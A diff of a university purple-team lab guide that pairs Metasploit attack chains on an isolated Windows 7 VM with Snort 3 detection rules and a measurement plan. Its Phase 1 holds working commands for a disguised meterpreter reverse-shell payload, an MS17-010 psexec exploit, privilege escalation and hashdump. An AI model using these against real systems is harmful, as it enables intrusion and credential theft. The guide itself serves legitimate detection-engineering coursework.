@@ -2,22 +2,98 @@
 
 **Project 2 — Exploitation, Detection Engineering & IDS Evaluation**
 
-This is the working guide. Follow it phase by phase inside your VMs. Everything you
-capture along the way feeds the final report and the GitHub repository.
+Working guide. Follow it phase by phase; everything you capture feeds the final
+report and the repository.
 
 Repository root: `D:\Project-2-Purple-Team-Lab`
+
+> **Revision note.** This guide was rewritten after the lab was built. The original
+> plan called for a dedicated Ubuntu 20.04 sensor running Snort 2.9. That was
+> abandoned — see [Design decisions](#design-decisions) for why, and what replaced
+> it. The reasoning belongs in the report; changing plans in response to real
+> constraints is engineering, not failure.
 
 ---
 
 ## Contents
 
+- [Design decisions](#design-decisions)
+- [Confirmed lab facts](#confirmed-lab-facts)
 - [Phase 0 — Lab construction](#phase-0--lab-construction)
 - [Phase 1 — Attack chains](#phase-1--attack-chains)
 - [Phase 2 — Detection engineering](#phase-2--detection-engineering)
 - [Phase 3 — Measurement](#phase-3--measurement)
 - [Phase 4 — Research report](#phase-4--research-report)
 - [Evidence checklist](#evidence-checklist)
-- [Troubleshooting](#troubleshooting)
+- [Troubleshooting log](#troubleshooting-log)
+
+---
+
+## Design decisions
+
+Three deviations from both the original plan and the SIT182 task sheets. Each is
+deliberate, and each belongs in the methodology section of the report.
+
+### 1. Host-only networking instead of bridged
+
+Tasks 4.4HD and 8.2HD both instruct the use of a Bridged Adapter. That places a
+deliberately unpatched Windows 7 host, with the firewall off and Defender disabled,
+directly onto the home LAN. Host-only confines every packet to the hypervisor.
+
+The victim has exactly one adapter, host-only, and no route anywhere else. Kali has
+a second NAT adapter for package installation which is **disabled during all attack
+runs** so captures contain lab traffic only.
+
+### 2. Two VMs, with Snort on Kali — not a dedicated sensor
+
+The intended design used a third Ubuntu VM as an independent sensor watching the
+segment in promiscuous mode. That was abandoned because the host runs
+Virtualization-Based Security, which holds the CPU's VT-x extensions. VirtualBox
+therefore falls back to the NEM backend:
+
+```
+HM: HMR3Init: Attempting fall back to NEM: VT-x is not available
+```
+
+Under NEM the Ubuntu installer would not complete. Disabling VBS on the host was
+possible but was declined as an unnecessary reduction of host security posture for a
+lab exercise.
+
+**Consequence, stated honestly:** the IDS is not an independent out-of-band sensor.
+It runs on Kali, which is also the attacking host. Kali is an endpoint of every
+attack, so it observes all relevant traffic — but this is a real limitation and is
+recorded as such in the report's limitations section. A production deployment would
+use a SPAN port or network TAP.
+
+### 3. Snort 3, not Snort 2.9
+
+Task 8.2HD is built around Snort 2.9, which is end-of-life and was dropped from
+Debian and Ubuntu archives. Kali ships **Snort 3.12.2.0** natively. Snort 3 is what
+is actually deployed in 2026, so this is a modernisation rather than a compromise.
+
+Practical differences: configuration is `snort.lua` rather than `snort.conf`, rule
+syntax differs slightly, and Snort 3 offers a native JSON alert output that makes
+programmatic analysis far cleaner.
+
+---
+
+## Confirmed lab facts
+
+Verified on this machine — do not re-derive.
+
+| Item | Value |
+|---|---|
+| Host | Windows 11 Home, 31.5 GB RAM, VirtualBox 7.2.12 |
+| Host virtualisation | VBS active; VirtualBox running on NEM, not native VT-x |
+| Attacker / sensor | Kali, user `mannraj`, `eth0` = `192.168.56.10` (static), `eth1` = NAT (updates only) |
+| IDS | Snort 3.12.2.0, DAQ 3.0.24, libpcap 1.10.5 |
+| Victim | Windows 7 SP1 (build 6.1.7601), **32-bit**, Administrator access |
+| Victim source | `IE8 - Win7.ova`, Microsoft developer image, 5.3 GB |
+| Host-only network | `192.168.56.0/24`, DHCP disabled |
+| Ubuntu ISO | `D:\ISOs\ubuntu-20.04.6-live-server-amd64.iso`, SHA-256 verified — unused, retained |
+
+**The victim being 32-bit is the single most consequential fact here.** It dictates
+payload architecture in Phase 1 and rules out the standard EternalBlue module.
 
 ---
 
@@ -25,185 +101,139 @@ Repository root: `D:\Project-2-Purple-Team-Lab`
 
 ### Topology
 
-All three VMs sit on a single VirtualBox **Host-Only** network, `192.168.56.0/24`.
-No bridged adapters. Nothing in this lab touches your home LAN or the internet.
-
-| VM | Role | Static IP | RAM | Adapter 1 | Adapter 2 |
-|---|---|---|---|---|---|
-| Kali Linux | Attacker | 192.168.56.10 | 4 GB | Host-Only (`eth0`) | NAT — *disabled during runs* |
-| Windows 7 SP1 | Victim | 192.168.56.20 | 2 GB | Host-Only only | **none, ever** |
-| Ubuntu 20.04 Server | Snort sensor | 192.168.56.30 | 2 GB | NAT (`enp0s3`) | Host-Only (`enp0s8`), promiscuous |
-
-**The victim gets one adapter and it is host-only.** Windows 7 SP1 with no patches,
-SMBv1 enabled, firewall off and Defender disabled is precisely the machine that
-WannaCry ate in 2017. It must never see a route to the internet — not for updates,
-not for "just a second to download something". If you need a file on it, serve it
-from Kali over the host-only network.
-
-The sensor needs a NAT adapter purely to `apt install snort`. Disable it once Snort
-is installed so the sensor is also isolated during measured runs — and note in the
-report that the sensor was air-gapped during data collection.
-
-Kali's NAT adapter is likewise for updates only. Turn it off before any attack run so
-your captures contain lab traffic and nothing else.
-
-### Why host-only instead of the bridged adapter the task sheets specify
-
-Both task sheets instruct you to set the adapter to Bridged. That places a machine
-you are about to infect with a live reverse shell directly onto your home network,
-alongside your phone, your router and any other device on it. Host-only keeps every
-packet inside the hypervisor.
-
-Record this decision in the report. A deliberate, justified deviation from supplied
-instructions on containment grounds is a genuine professional judgement call and is
-worth more than blind compliance.
-
-### Step 0.1 — Create the host-only network
-
-In VirtualBox: **Tools → Network → Host-only Networks → Create**.
-
-- IPv4 address: `192.168.56.1`, mask `255.255.255.0`
-- DHCP server: **disabled** (we assign static IPs so addresses stay stable across
-  snapshots, and so your pcaps and rules never go stale)
-
-### Step 0.2 — CRITICAL: promiscuous mode on the sensor
-
-A VirtualBox host-only network behaves like a **switch**, not a hub. By default the
-sensor VM will *not* see unicast traffic flowing between Kali and Windows 7 — Snort
-will sit there logging nothing and you will lose hours to it.
-
-For the **Ubuntu sensor VM's host-only adapter (Adapter 2)**:
-
-**Settings → Network → Adapter 2 → Advanced → Promiscuous Mode → `Allow All`**
-
-Then inside the sensor, put the interface itself into promiscuous mode:
-
 ```
-sudo ip link set enp0s8 promisc on
-ip link show enp0s8        # confirm PROMISC appears in the flags
+Windows 11 host (VirtualBox)
+│
+├── Kali          192.168.56.10   attacker + Snort 3 sensor
+└── Win7-Victim   192.168.56.20   victim (32-bit, unpatched)
+                  │
+                  └── host-only 192.168.56.0/24, DHCP off, no route out
 ```
 
-Verify before going further — from Kali, ping the Windows 7 VM while the sensor runs:
+### Step 0.1 — Host-only network ✅
+
+`192.168.56.1`, mask `255.255.255.0`, adapter configured manually, DHCP disabled.
+
+Note there is a second host-only adapter (`...Adapter #2`, `169.254.x`) unrelated to
+this lab. Always attach VMs to **`VirtualBox Host-Only Ethernet Adapter`** — the one
+without the `#2`.
+
+### Step 0.2 — Kali ✅
+
+- Adapter 1 → Host-only, `eth0`, static `192.168.56.10/24`
+- Adapter 2 → NAT, `eth1`, DHCP (`10.0.3.15`) — **disable before every attack run**
+- Snort 3.12.2.0 installed
+
+If `eth1` ever stops resolving DNS, check it has not been left with a static address
+from a previous bridged configuration — see the [troubleshooting log](#troubleshooting-log).
+
+### Step 0.3 — Windows 7 victim
+
+Import `IE8 - Win7.ova` with Machine Base Folder on `D:\VMs` and a regenerated MAC
+address.
+
+**Before first boot — Settings → Network:**
+- Adapter 1 → Host-only Adapter, `VirtualBox Host-Only Ethernet Adapter`
+- Adapters 2–4 → disabled
+
+Task 3.1P had this VM fully air-gapped for malware analysis. We need Kali to reach
+it, so host-only replaces "no network" — equally contained, but reachable from the
+attacker.
+
+**Static IP** — Control Panel → Network and Sharing Center → Change adapter settings
+→ Properties → IPv4:
+- IP `192.168.56.20`, mask `255.255.255.0`
+- **Gateway blank, DNS blank** — deliberate second layer of containment
+
+### Step 0.4 — Weaken the victim, logging every change
+
+Each item below becomes part of the target configuration in the methodology.
+
+- Windows Firewall off, all profiles — `netsh advfirewall set allprofiles state off`
+- Windows Defender disabled
+- File and Printer Sharing enabled (this is what makes port 445 listen)
+- UAC → Never notify (`msconfig` → Tools → Change UAC Settings)
+- Windows Update disabled, no patches
+- `systeminfo > C:\sysinfo.txt` — retain as evidence
+
+### Step 0.5 — Connectivity checkpoint
+
+From Kali:
 
 ```
-sudo tcpdump -i enp0s8 -n icmp
+ping -c3 192.168.56.20
+sudo nmap -p 139,445 192.168.56.20
 ```
 
-If you see the ICMP echo requests between `.10` and `.20`, the sensor is correctly
-positioned. If you see nothing, promiscuous mode is not set — go back and fix it.
-Do not proceed until this test passes.
+Port 445 must be **open**. If it is not, Chain B has nothing to attack — recheck the
+firewall and File and Printer Sharing.
 
-### Step 0.3 — Static addressing
+### Step 0.6 — Snapshots
 
-Set each VM to its address from the table above. Confirm with `ip a` on Kali and
-Ubuntu, and `ipconfig /all` on Windows 7. **Screenshot all three** — the Kali one is
-the direct answer to Task 8.2HD Q2.
+| Snapshot | When | Purpose |
+|---|---|---|
+| `clean-baseline` | After import, before any change | Untouched fallback; eval licence reset |
+| `ready-to-infect` | After Step 0.4 | **Restored before every attack run** |
 
-Verify full mesh connectivity by pinging every host from every other host.
+`ready-to-infect` is the working state. Every measured run starts from it, so no run
+is contaminated by residue from the previous one.
 
-### Step 0.4 — Weaken the victim, and log every change
+### Step 0.7 — Baseline capture
 
-The Windows 7 VM is vulnerable by design. Make these changes and write down each one
-— this becomes the "target configuration" section of your methodology, and it is what
-makes the experiment reproducible by someone else.
-
-- Windows Firewall: off (all profiles)
-- Windows Defender / any AV: disabled
-- SMBv1: enabled (required for the MS17-010 chain)
-- UAC: lowest setting
-- Windows Update: disabled, no patches applied
-- Note the exact build: `systeminfo` — capture OS version, build number, hotfixes
-- Note the architecture: `wmic os get osarchitecture` — this decides which payload
-  you generate
-
-### Step 0.5 — Snapshot everything
-
-Snapshot all three VMs as **`clean-baseline`** before anything else happens.
-
-You will restore these repeatedly. EternalBlue in particular can blue-screen the
-target, and you need a clean victim for every measured attack run so your results
-are not contaminated by leftover state from a previous run.
-
-### Step 0.6 — Baseline capture (do not skip)
-
-Before any attack, capture 10–15 minutes of ordinary traffic: the victim browsing
-between VMs, file shares, idle chatter, DNS.
+With Kali's NAT adapter **disabled**:
 
 ```
-sudo tcpdump -i enp0s8 -w /captures/baseline-clean.pcap
+sudo mkdir -p /captures
+sudo tcpdump -i eth0 -w /captures/baseline-clean.pcap
 ```
 
-This is your **false-positive control**. Replaying your finished rules against this
-clean capture is how you prove a rule does not fire on benign traffic. Without a
-control capture you cannot report a false-positive rate, and the measurement half of
-the project collapses.
+Generate 10–15 minutes of benign traffic: pings both directions, browsing from the
+victim to Apache on Kali, an SMB share listing, idle time. Then Ctrl-C.
+
+This is the **false-positive control**. Every rule written in Phase 2 is replayed
+against it. A rule that fires here is a rule that would bury a real SOC. Without this
+file there is no false-positive rate, and the measurement half of the project has
+nothing to stand on.
 
 ---
 
 ## Phase 1 — Attack chains
 
-Covers **Task 4.4HD**.
-
-Run two chains. Two attack paths with different characteristics give you a far
-richer detection problem than one, and let you compare user-initiated compromise
-against remote exploitation.
-
-Restore the victim to `clean-baseline` before each run.
-
-### Always: start the capture first
-
-On the sensor, before every single attack run:
+Covers **Task 4.4HD**. Restore `ready-to-infect` before each run. Kali's NAT adapter
+off. Start the capture *before* the attack:
 
 ```
-sudo tcpdump -i enp0s8 -w /captures/chainA-run1-$(date +%Y%m%d-%H%M%S).pcap
+sudo tcpdump -i eth0 -w /captures/chainA-run1-$(date +%Y%m%d-%H%M%S).pcap
 ```
 
-Note the wall-clock start time. You need timestamps to compute detection latency
-in Phase 3.
-
-These pcaps are the raw research data required by Task 10.2HD, they let you re-test
-rules offline as many times as you like without rebuilding the lab, and they are what
-makes the GitHub repo genuinely reproducible. **The pcaps matter more than the
-screenshots.**
+Record the wall-clock start time — detection latency in Phase 3 depends on it.
 
 ### Chain A — social-engineered payload
-
-This is the chain the task sheet asks for.
 
 **A1. Reconnaissance**
 
 ```
-nmap -sn 192.168.56.0/24
-nmap -sS -sV -p- 192.168.56.20 -oN recon-full.txt
+sudo nmap -sn 192.168.56.0/24
+sudo nmap -sS -sV -p- 192.168.56.20 -oN /captures/recon-full.txt
 ```
 
-**A2. Generate the payload**
-
-32-bit victim:
+**A2. Payload — 32-bit, not x64**
 
 ```
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.10 LPORT=4444 -f exe -o /var/www/html/update.exe
-```
-
-64-bit victim:
-
-```
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.10 LPORT=4444 -f exe -o /var/www/html/update.exe
-```
-
-Record the SHA-256 — the repo ships this hash instead of the binary:
-
-```
 sha256sum /var/www/html/update.exe
 ```
 
-**A3. Stage the delivery**
+The victim is 32-bit. `windows/x64/meterpreter/reverse_tcp` will connect and die
+immediately. Record the hash — the repository ships the hash, never the binary.
+
+**A3. Delivery**
 
 ```
 sudo systemctl start apache2
 ```
 
-**A4. Start the handler**
+**A4. Handler**
 
 ```
 msfconsole -q
@@ -215,10 +245,8 @@ set ExitOnSession false
 exploit -j
 ```
 
-**A5. Execute on the victim**
-
-On Windows 7, browse to `http://192.168.56.10/update.exe`, download and run it.
-Screenshot the download and the session opening back on Kali.
+**A5. Execution** — on the victim, browse to `http://192.168.56.10/update.exe`,
+download, run.
 
 **A6. Post-exploitation**
 
@@ -232,21 +260,15 @@ getsystem
 getuid
 hashdump
 screenshot
-download C:\\Users\\<user>\\Documents\\<file>
 shell
 ```
 
-`getsystem` is your privilege escalation demonstration — capture `getuid` both before
-and after so the escalation is visible. `migrate` into a long-lived process shows you
-understand persistence of access within a session.
+Capture `getuid` both before and after `getsystem` — that pair is the privilege
+escalation evidence.
 
-### Chain B — remote exploitation, MS17-010 / EternalBlue
+### Chain B — MS17-010
 
-CVE-2017-0144. No user interaction required. This is the chain that lifts the project
-above coursework, and it produces highly distinctive SMB traffic that you will write
-a signature against.
-
-**B1. Confirm the target is vulnerable**
+**B1. Confirm vulnerability**
 
 ```
 use auxiliary/scanner/smb/smb_ms17_010
@@ -254,309 +276,286 @@ set RHOSTS 192.168.56.20
 run
 ```
 
-**B2. Exploit**
+**B2. Exploit — `psexec`, not `eternalblue`**
 
 ```
-use exploit/windows/smb/ms17_010_eternalblue
+use exploit/windows/smb/ms17_010_psexec
 set RHOSTS 192.168.56.20
-set payload windows/x64/meterpreter/reverse_tcp
+set payload windows/meterpreter/reverse_tcp
 set LHOST 192.168.56.10
 set LPORT 5555
 check
 exploit
 ```
 
-Note the different port (5555) from Chain A. That gives you two distinct C2 channels
-to detect, and lets you show a port-agnostic rule beating a port-specific one.
+`ms17_010_eternalblue` targets x64 Windows 7 and Server 2008 R2 and is unreliable
+against this 32-bit target. `ms17_010_psexec` exploits the same vulnerability in a
+way that works on x86. Same CVE, same detection story, a module that actually lands.
 
-If the target blue-screens: that is a documented, expected failure mode of this
-exploit against certain kernel versions. Restore the snapshot, retry, and **write it
-up** — a failed exploitation attempt with an explanation of the mechanism is more
-interesting than a clean success, and it produces exploitation traffic worth
-detecting even when the exploit fails.
+Port 5555 differs deliberately from Chain A's 4444 — two distinct C2 channels, which
+Phase 2 uses to demonstrate why port-specific signatures are brittle.
 
-**B3. Same post-exploitation sequence as Chain A.**
+**B3.** Same post-exploitation sequence as Chain A.
 
-### Screencast
+### Chain C — IE8 browser exploit (optional)
 
-Record both chains with OBS Studio. Show the commands, the session establishing, and
-the post-exploitation. Upload unlisted to YouTube — the link goes in the README and
-answers Task 4.4HD Q1.
+This image exists as an Internet Explorer 8 test VM, making browser exploitation its
+natural attack surface. A drive-by compromise is closer to real initial access than
+SMB worming and produces distinctive HTTP traffic.
 
-### Reflection (4.4HD Q2)
-
-Write it as you go, not afterwards. What broke, what you had to research, where the
-guide was wrong, what surprised you. Specifics beat generalities.
+Browser exploits are fussy. Attempt this only once Chains A and B are landing
+reliably. A documented failed attempt is still worth writing up.
 
 ---
 
 ## Phase 2 — Detection engineering
 
-Covers **Task 8.2HD**.
+Covers **Task 8.2HD**, using Snort 3.
 
-### Step 2.1 — Install Snort on the Ubuntu sensor
+### Step 2.1 — Configure
 
-```
-sudo apt update
-sudo apt install -y snort
-```
+Edit `/etc/snort/snort.lua`:
 
-The installer prompts for the address range and interface — give it `192.168.56.0/24`
-and your host-only interface.
-
-**Why not the task sheet's method:** 8.2HD instructs you to delete
-`/var/lib/apt/lists`, overwrite Kali's `sources.list` with an Ubuntu one, and
-authenticate with `apt-key`. `apt-key` has been deprecated since 2021, and grafting
-Ubuntu repositories onto a Kali base is a well-known way to break the package system
-beyond repair. Installing on a real Ubuntu host gets you the identical
-`/etc/snort/snort.conf` layout with none of that risk. Document the deviation.
-
-For **8.2HD Q1** (what APT is and why it is useful): package manager for
-Debian-family systems — dependency resolution, repository management, signed
-packages, atomic install/upgrade/removal. The Lynx install from the task sheet is a
-fine demonstration:
-
-```
-sudo apt-get -y install lynx
+```lua
+HOME_NET = '192.168.56.0/24'
+EXTERNAL_NET = 'any'
 ```
 
-### Step 2.2 — Configure
+**A design point worth raising in the report:** in a flat lab both attacker and
+victim sit inside `HOME_NET`, so the conventional `$EXTERNAL_NET -> $HOME_NET`
+direction that most public rulesets assume does not apply. Rules here key on
+behaviour and content rather than on network direction. That is a genuine and
+non-obvious difference between lab detection and production detection.
 
-Edit `/etc/snort/snort.conf`:
+### Step 2.2 — Prove the pipeline
 
-**Step 1 of the config** — set the home network:
-
-```
-ipvar HOME_NET 192.168.56.0/24
-ipvar EXTERNAL_NET !$HOME_NET
-```
-
-Setting `EXTERNAL_NET` as the inverse of `HOME_NET` rather than `any` cuts a large
-class of false positives. Worth a sentence in the report.
-
-**Step 7 of the config** — comment out every bundled `include $RULE_PATH/*.rules`
-line, then uncomment exactly one:
+`/etc/snort/rules/local.rules`:
 
 ```
-include $RULE_PATH/local.rules
+alert tcp any any -> any any ( msg:"LAB-TEST TCP connection detected"; sid:1000000; rev:1; )
 ```
 
-### Step 2.3 — Prove the pipeline works
-
-Put the task sheet's basic rule in `/etc/snort/rules/local.rules`:
+Validate before running — Snort 3 has a config test mode:
 
 ```
-alert tcp any any -> any any (msg:"TCP Connection Detected!"; sid:100006927; rev:1;)
+sudo snort -c /etc/snort/snort.lua -R /etc/snort/rules/local.rules --warn-all -T
 ```
 
-Run Snort:
+Run live:
 
 ```
-sudo snort -d -l /var/log/snort/ -A console -c /etc/snort/snort.conf -i enp0s8
+sudo snort -c /etc/snort/snort.lua -R /etc/snort/rules/local.rules -i eth0 -A alert_fast -l /var/log/snort -s 65535 -k none
 ```
 
-Generate traffic and confirm alerts appear. Screenshot it — that is **8.2HD Q3**.
+Generate traffic, confirm alerts. **This answers 8.2HD Q3.**
 
-This rule is deliberately terrible: it alerts on every TCP packet on the wire. Say so
-in the report. It demonstrates the pipeline is working and simultaneously demonstrates
-why alert fatigue destroys real SOCs. Then replace it with rules that mean something.
+This rule is deliberately awful — it fires on every TCP packet. Keep the screenshot,
+then say so in the report: it proves the pipeline works while demonstrating exactly
+the alert fatigue that makes real SOCs miss real intrusions.
 
-### Step 2.4 — The real ruleset
+### Step 2.3 — The real ruleset
 
 Task Q4 asks for two rules. Write six, each targeting traffic your own attacks
-actually generated. Every rule needs a unique SID in the local range (1,000,000+).
+produced. SIDs from 1,000,001 up.
 
-Design them against your pcaps, iterating with offline replay (Step 2.5) rather than
-re-running attacks each time.
-
-| # | Detects | Approach |
-|---|---|---|
-| 1 | Host discovery sweep | ICMP echo with `threshold` on unique destinations |
-| 2 | Nmap SYN scan | `flags:S;` plus `threshold type threshold, track by_src` |
-| 3 | Executable download over HTTP | `content:"GET"; content:".exe"; http_uri` |
-| 4 | Meterpreter reverse_tcp callback | Outbound from `$HOME_NET` to the C2 port |
-| 5 | SMBv1 exploitation attempt | Content match on the MS17-010 trans2 pattern |
-| 6 | Meterpreter stager | Byte-pattern match on the initial stage transfer |
-
-Two design points to raise in the report:
-
-- **Rule 4 is port-specific and therefore fragile.** Show it failing when Chain B uses
-  port 5555, then write a port-agnostic version. That contrast is a real detection
-  engineering lesson and is exactly the kind of thing that reads well.
-- **Thresholds and rate limits** are what separate a rule that works in a lab from one
-  that works in production. Explain why you tuned each one to the value you chose.
-
-For each rule record: the rule text, the SID, what it is designed to catch, and its
-observed behaviour against both the attack pcaps and the clean baseline.
-
-Screenshot the rules firing — that is **8.2HD Q4**.
-
-### Step 2.5 — Offline replay (the technique that saves the project)
-
-You do not need to re-run attacks to test rules. Replay the captures:
+**Treat what follows as starting points, not finished signatures.** Tune each one
+against your own pcaps — that iteration *is* detection engineering, and the tuning
+notes are report material.
 
 ```
-sudo snort -r /captures/chainA-run1.pcap -c /etc/snort/snort.conf -A console -l /tmp/snortout -q
+# 1 — host discovery sweep
+alert icmp any any -> $HOME_NET any ( msg:"LAB-RECON ICMP echo request burst";
+  itype:8; detection_filter:track by_src, count 15, seconds 5;
+  sid:1000001; rev:1; )
+
+# 2 — TCP SYN scan
+alert tcp any any -> $HOME_NET any ( msg:"LAB-RECON TCP SYN scan";
+  flags:S,12; detection_filter:track by_src, count 30, seconds 5;
+  sid:1000002; rev:1; )
+
+# 3 — executable delivered over HTTP
+alert http any any -> any any ( msg:"LAB-DELIVERY executable download over HTTP";
+  flow:to_server,established; http_uri; content:".exe", nocase;
+  sid:1000003; rev:1; )
+
+# 4 — C2 callback, port-specific (deliberately brittle — see below)
+alert tcp $HOME_NET any -> $HOME_NET 4444 ( msg:"LAB-C2 Meterpreter callback to 4444";
+  flow:to_server; sid:1000004; rev:1; )
+
+# 5 — SMBv1 Trans2, possible MS17-010
+alert tcp any any -> $HOME_NET 445 ( msg:"LAB-EXPLOIT SMBv1 Trans2 request";
+  flow:to_server,established; content:"|FF|SMB|32|", offset 4, depth 5;
+  sid:1000005; rev:1; )
+
+# 6 — PE header over a non-HTTP channel, possible Meterpreter stage
+alert tcp $HOME_NET any -> $HOME_NET any ( msg:"LAB-C2 PE header on non-HTTP channel";
+  flow:established; content:"MZ", depth 2;
+  content:"This program cannot be run in DOS mode";
+  sid:1000006; rev:1; )
 ```
 
-Iterate on rules in seconds instead of rebuilding VMs. This is also the mechanism by
-which anyone cloning the repo can reproduce your results exactly, which is what the
-"attach your raw data" requirement in 10.2HD is really asking for.
+**Rule 4 is intentionally fragile.** It matches port 4444 only, so Chain B on port
+5555 walks straight past it. Demonstrate that failure, then write a port-agnostic
+replacement. That contrast — a signature that looked fine until the adversary changed
+one number — is the most valuable single result this project can produce, and it is
+entirely your own data.
+
+Screenshot the rules firing. **That answers 8.2HD Q4.**
+
+### Step 2.4 — Offline replay
+
+You never need to re-run an attack to test a rule:
+
+```
+snort -c /etc/snort/snort.lua -R /etc/snort/rules/local.rules -r /captures/chainA-run1.pcap -A alert_fast -s 65535
+```
+
+Iterate in seconds instead of rebuilding VMs. This is also how anyone cloning the
+repository reproduces your results, which is what 10.2HD's "attach your raw data"
+requirement is really asking for.
+
+For machine-readable output feeding Phase 3:
+
+```
+snort -c /etc/snort/snort.lua -R /etc/snort/rules/local.rules -r /captures/chainA-run1.pcap -A alert_json -l /var/log/snort
+```
 
 ---
 
 ## Phase 3 — Measurement
 
-This is the phase that turns three lab write-ups into an engineering project, and it
-supplies the Results section of the research report.
+For each rule, replay every attack pcap **and** `baseline-clean.pcap`, recording:
 
-For each of the six rules, replay every attack pcap **and** the clean baseline, then
-record:
+- **True positives** — fired on the traffic it targets?
+- **False positives** — fired on the clean baseline? How many?
+- **Detection latency** — first attack packet to first alert
+- **Alert volume** — a rule firing 40,000 times is useless even when correct
 
-- **True positives** — did it fire on the attack traffic it targets?
-- **False positives** — did it fire on `baseline-clean.pcap`? How many times?
-- **Detection latency** — seconds between the first attack packet and the first alert
-- **Alert volume** — total alerts per run (a rule that fires 40,000 times is useless
-  even when technically correct)
+Then a coverage map: which stages of each attack chain were detected, and which
+passed silently.
 
-Build a results table: rules down the side, chains across the top. Then a summary of
-which stages of the attack chain were detected and which passed silently.
+**The gaps matter more than the hits.** Expect post-exploitation inside an
+established session to be largely invisible to signature matching — it is bytes on
+an already-open socket. That finding drives the Discussion.
 
-The gaps are the most valuable part of the analysis. Expect to find that
-post-exploitation activity inside an established session is largely invisible to
-signature matching, because it is just bytes on an already-open socket. That finding
-drives the Discussion section.
-
-I will write the Python tooling (`scripts/parse_alerts.py`, `scripts/replay_and_score.py`)
-to parse your Snort logs into `results/detection_metrics.csv` and generate the charts
-once you hand me the raw logs.
+I will write `scripts/parse_alerts.py` and `scripts/replay_and_score.py` to turn the
+JSON alert output into `results/detection_metrics.csv` and charts once you hand over
+the raw logs.
 
 ---
 
 ## Phase 4 — Research report
 
-Covers **Task 10.2HD, Option 3** — Emerging Threats and Defense Mechanisms.
-2,500–3,000 words, IEEE referencing.
+**Task 10.2HD, Option 3.** 2,500–3,000 words, IEEE referencing.
 
-**Working title:** *Detecting Post-Exploitation Command-and-Control: An Experimental
+**Title:** *Detecting Post-Exploitation Command-and-Control: An Experimental
 Evaluation of Signature-Based Intrusion Detection Against Meterpreter Reverse-TCP and
 MS17-010 Exploitation*
 
-Mapped onto the supplied template:
+**Research question:** To what extent can signature-based network intrusion detection
+identify the stages of a Meterpreter-based intrusion, and where does it fail?
 
 | Section | Content | Words |
 |---|---|---|
-| Introduction | The threat, the research question, why it matters | ~350 |
-| Methodology | The lab as experimental apparatus, both chains, ruleset design, how you measured | ~600 |
+| Introduction | Threat, research question, significance | ~350 |
+| Methodology | Lab as apparatus, both chains, ruleset design, measurement approach | ~600 |
 | Results | Detection table, latency, false positives, charts | ~600 |
-| Discussion | Where signature detection succeeded and failed, why, and what follows | ~800 |
+| Discussion | Where detection held and where it broke, and why | ~800 |
 | Conclusion | Findings, limitations, future work | ~350 |
 | References | IEEE, 12–15 credible sources | — |
-| Appendices | Full ruleset, link to repo for pcaps and logs | — |
+| Appendices | Ruleset, repository link for pcaps and logs | — |
 
-**The research question:** *To what extent can signature-based network intrusion
-detection identify the stages of a Meterpreter-based intrusion, and where does it
-fail?*
+**Discussion themes carrying the 20 critical-analysis marks:**
 
-**Discussion themes that earn the 20 Critical Analysis marks:**
+- Signature detection covers delivery and exploitation well, degrades sharply against
+  post-exploitation inside an established session
+- Rule 4 failing on Chain B — signature brittleness demonstrated with your own data,
+  not a citation
+- Encryption and payload encoding defeat content matching outright; testable if time
+  allows
+- Behavioural detection as complement rather than replacement, with an honest account
+  of its own false-positive cost
+- Detection latency versus response capability: what does a 3-second detection buy a
+  defender who cannot act for 30 minutes?
 
-- Signature detection catches delivery and exploitation, but degrades sharply against
-  post-exploitation traffic inside an established session
-- The port-specific rule failing on Chain B is a concrete demonstration of signature
-  brittleness — use your own data, not a citation
-- Encryption and payload obfuscation (`msfvenom` encoders, staged vs stageless
-  payloads) defeat content matching entirely — you can test this if you have time
-- The case for behavioural and anomaly-based detection as a complement, not a
-  replacement — and honestly, its own false-positive cost
-- Detection latency versus dwell time: what does a 3-second detection actually buy a
-  defender who cannot respond for 30 minutes?
-
-**Limitations to state honestly** (markers and hiring managers both reward this):
-single victim OS, no encrypted C2 tested, small sample of runs, lab traffic is far
-cleaner than production, no evasion techniques attempted.
-
-The rubric's 20 marks for Originality are earned by the fact that every number in the
-Results section came from an experiment you ran yourself.
+**Limitations to state plainly:** single victim OS and architecture, sensor not
+independent of the attacking host, no encrypted C2 tested, small number of runs, lab
+traffic far cleaner than production, no evasion attempted.
 
 ---
 
 ## Evidence checklist
 
-Collect these as you go. The report writes itself if you have them, and you will be
-rebuilding VMs if you do not.
-
 **Phase 0**
-- [ ] Network topology diagram
-- [ ] `ip a` on Kali (8.2HD Q2) and Ubuntu, `ipconfig /all` on Windows 7
+- [ ] Topology diagram
+- [ ] `ip a` on Kali (**8.2HD Q2**), `ipconfig /all` on the victim
 - [ ] `systeminfo` and `wmic os get osarchitecture` from the victim
-- [ ] Full list of every weakening change made to the victim
-- [ ] Snapshot names and what state each represents
+- [ ] Complete list of weakening changes
+- [ ] `nmap -p 445` confirming the attack surface is exposed
+- [ ] Snapshot names and what each represents
 - [ ] `baseline-clean.pcap`
 
 **Phase 1**
-- [ ] Every command as copy-pasted **text**, not only screenshots
-- [ ] `msfvenom` command plus SHA-256 of the payload
-- [ ] pcap for every attack run, named consistently
-- [ ] Wall-clock start time of each run
-- [ ] Screenshots: session established, `getuid` before and after `getsystem`, `sysinfo`, `hashdump`
+- [ ] Every command as copy-pasted text, not only screenshots
+- [ ] `msfvenom` command and payload SHA-256
+- [ ] A pcap per run, consistently named, with wall-clock start times
+- [ ] Screenshots: session established, `getuid` before/after `getsystem`, `sysinfo`, `hashdump`
 - [ ] Nmap output files
-- [ ] Screencast for both chains
-- [ ] Reflection notes written the same day
+- [ ] Screencast of both chains
+- [ ] Reflection notes written same-day (**4.4HD Q2**)
 
 **Phase 2**
-- [ ] `snort.conf` diff against the stock file
-- [ ] Final `local.rules` with comments explaining each rule
-- [ ] Raw `/var/log/snort/alert` from every run
+- [ ] `snort.lua` diff against stock
+- [ ] Final `local.rules`, commented
+- [ ] Alert logs from every run, text and JSON
 - [ ] Console screenshots of rules firing
-- [ ] Notes on every rule that did *not* work and why
+- [ ] Notes on every rule that did *not* work, and why
 
 **Phase 3**
-- [ ] Replay output for all six rules against all pcaps
+- [ ] Replay output, all rules against all pcaps
 - [ ] False-positive counts from the clean baseline
 - [ ] Latency measurements
 
-Copy everything into `D:\Project-2-Purple-Team-Lab\evidence\` as you go — pcaps to
-`pcaps\`, Snort logs to `logs\`, screenshots to `docs\screenshots\`.
+Copy into `D:\Project-2-Purple-Team-Lab\` as you go — pcaps to `pcaps\`, logs to
+`logs\`, screenshots to `docs\screenshots\`. Commit after each phase.
 
 ---
 
-## Troubleshooting
+## Troubleshooting log
 
